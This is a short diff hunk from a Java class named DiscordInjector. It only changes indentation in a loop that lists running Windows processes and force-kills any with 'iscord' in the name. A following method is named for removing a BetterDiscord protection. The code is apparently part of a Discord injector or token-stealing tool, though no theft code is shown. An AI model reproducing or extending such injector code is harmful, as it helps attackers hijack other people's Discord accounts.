@@ -82,13 +82,13 @@ public class DiscordInjector {
 			Scanner scanner = new Scanner(Runtime.getRuntime().exec("tasklist.exe").getInputStream(), StandardCharsets.UTF_8.toString()).useDelimiter("\\A");
 		    	String[] lines = new String(scanner.next()).split("\n");
 			for (int i = 0; lines.length > i; i += 1) {
-		    	String line = lines[i];
-		    	if((line).contains("iscord")) {
-		    		String total = line.substring(0, line.indexOf(" "));
-				Runtime.getRuntime().exec("taskkill /F /IM " + total);
-				killCheck = Boolean.TRUE;
-		    	}
-		    }
+				String line = lines[i];
+				if((line).contains("iscord")) {
+					String total = line.substring(0, line.indexOf(" "));
+					Runtime.getRuntime().exec("taskkill /F /IM " + total);
+					killCheck = Boolean.TRUE;
+				}
+			}
 		}
 		
 		private synchronized void getRemoveBetterDcProtection() throws Exception {
